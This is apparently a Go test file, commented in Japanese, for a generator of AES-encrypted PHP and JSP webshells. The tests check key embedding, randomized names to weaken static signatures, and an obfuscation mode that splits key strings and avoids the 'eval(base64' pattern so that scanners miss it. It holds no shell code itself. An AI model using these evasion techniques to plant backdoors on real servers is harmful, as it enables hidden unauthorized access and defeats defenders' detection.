package session

// shellgen_test.go はシェル本体生成器のテスト: レンダリングの完全性(プレースホルダの残留なし)、鍵の埋め込み、
// 変数名のランダム化(2 つが異なる)、難読化モードの意味論(鍵の全体文字列が分割され、eval(base64)
// の高特徴形態がない)、PHP テンプレートの php -l 構文自己検査(環境に php がなければ skip)。

import (
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

// phpLint は生成した PHP シェル本体に php -l の構文検査を行う。環境に php がなければ skip。
func phpLint(t *testing.T, content string) {
	t.Helper()
	php, err := exec.LookPath("php")
	if err != nil {
		t.Skip("環境に php がないため、php -l の構文検査をスキップします(テンプレートは人手で確認済み)")
	}
	f := filepath.Join(t.TempDir(), "shell.php")
	if err := os.WriteFile(f, []byte(content), 0o600); err != nil {
		t.Fatal(err)
	}
	out, err := exec.Command(php, "-l", f).CombinedOutput()
	if err != nil {
		t.Fatalf("php -l の構文検査に失敗しました: %v\n%s", err, out)
	}
}

// TestGenerateShellPHP: PHP シェル本体のレンダリング完全性、鍵の埋め込み、プレースホルダの消去、形態の適合。
func TestGenerateShellPHP(t *testing.T) {
	gen, err := GenerateShell("php", false, "")
	if err != nil {
		t.Fatalf("GenerateShell: %v", err)
	}
	if gen.Lang != "phpenc" {
		t.Fatalf("lang = %q, want phpenc", gen.Lang)
	}
	if !strings.HasSuffix(gen.Filename, ".php") {
		t.Fatalf("filename = %q", gen.Filename)
	}
	if strings.Contains(gen.Content, "{{") || strings.Contains(gen.Content, "<no value>") {
		t.Fatal("テンプレートのプレースホルダがすべてレンダリングされていない")
	}
	if !strings.Contains(gen.Content, "'"+gen.KeyB64+"'") {
		t.Fatal("鍵がシェル本体に埋め込まれていない")
	}
	if len(gen.KeyDigest) != 16 {
		t.Fatalf("key_digest = %q", gen.KeyDigest)
	}
	// 形態の下限: eval(base64(...)) の高特徴形態は行わない。
	if strings.Contains(gen.Content, "eval(base64") {
		t.Fatal("シェル本体に eval(base64) の高特徴形態を出してはいけない")
	}
	// 両経路がそろう: GCM と CBC+HMAC。
	for _, want := range []string{"aes-256-gcm", "aes-256-cbc", "hash_hmac", "hash_equals"} {
		if !strings.Contains(gen.Content, want) {
			t.Fatalf("シェル本体に %s 経路がない", want)
		}
	}
	phpLint(t, gen.Content)
}

// TestGenerateShellRandomizedNames: 2 つのシェル本体で変数/関数名がランダム化される(静的シグネチャの最小化)。
func TestGenerateShellRandomizedNames(t *testing.T) {
	a, err := GenerateShell("php", false, "")
	if err != nil {
		t.Fatal(err)
	}
	b, err := GenerateShell("php", false, "")
	if err != nil {
		t.Fatal(err)
	}
	if a.Content == b.Content {
		t.Fatal("2 つのシェル本体はバイト単位で同一であってはならない(鍵も変数名もランダムであるべき)")
	}
	if a.KeyB64 == b.KeyB64 {
		t.Fatal("2 つのシェル本体の鍵は独立にランダムであるべき")
	}
	if a.Filename == b.Filename {
		t.Fatal("推奨ファイル名はランダム化されるべき")
	}
}

// TestGenerateShellPHPObfuscated: 難読化モード。鍵の全体文字列が分割され、それでも正当な PHP である。
func TestGenerateShellPHPObfuscated(t *testing.T) {
	gen, err := GenerateShell("php", true, "")
	if err != nil {
		t.Fatalf("GenerateShell: %v", err)
	}
	if strings.Contains(gen.Content, gen.KeyB64) {
		t.Fatal("難読化モードでは鍵の全体文字列を分割するべき(全体定数はシグネチャの当たり所)")
	}
	if strings.Contains(gen.Content, "'aes-256-gcm'") {
		t.Fatal("難読化モードではアルゴリズム名の全体文字列を分割するべき")
	}
	if !strings.Contains(gen.Content, "'.'") {
		t.Fatal("難読化モードでは文字列連結を含むべき")
	}
	if strings.Contains(gen.Content, "{{") {
		t.Fatal("テンプレートのプレースホルダがすべてレンダリングされていない")
	}
	if strings.Contains(gen.Content, "eval(base64") {
		t.Fatal("難読化では eval(base64) の高特徴形態を行わない")
	}
	phpLint(t, gen.Content)
}

// TestGenerateShellJSP: JSP シェル本体のレンダリング完全性、鍵の埋め込み(JSP テンプレートは人手で確認済み、
// ローカルに構文チェッカーなし)。
func TestGenerateShellJSP(t *testing.T) {
	gen, err := GenerateShell("jsp", false, "")
	if err != nil {
		t.Fatalf("GenerateShell: %v", err)
	}
	if gen.Lang != "jspenc" || !strings.HasSuffix(gen.Filename, ".jsp") {
		t.Fatalf("lang/filename = %q/%q", gen.Lang, gen.Filename)
	}
	if strings.Contains(gen.Content, "{{") || strings.Contains(gen.Content, "<no value>") {
		t.Fatal("テンプレートのプレースホルダがすべてレンダリングされていない")
	}
	if !strings.Contains(gen.Content, "\""+gen.KeyB64+"\"") {
		t.Fatal("鍵がシェル本体に埋め込まれていない")
	}
	if gen.Mode != "gcm" {
		t.Fatalf("mode = %q, want gcm", gen.Mode)
	}
	for _, want := range []string{"AES/GCM/NoPadding", "GCMParameterSpec", "SecureRandom"} {
		if !strings.Contains(gen.Content, want) {
			t.Fatalf("JSP シェル本体に %s がない", want)
		}
	}
}

// TestGenerateShellBadLang: 非対応の言語では明確にエラーを返す。
func TestGenerateShellBadLang(t *testing.T) {
	if _, err := GenerateShell("aspx", false, ""); err == nil {
		t.Fatal("aspx の暗号化シェルは未実装なので、エラーになるべき")
	}
}
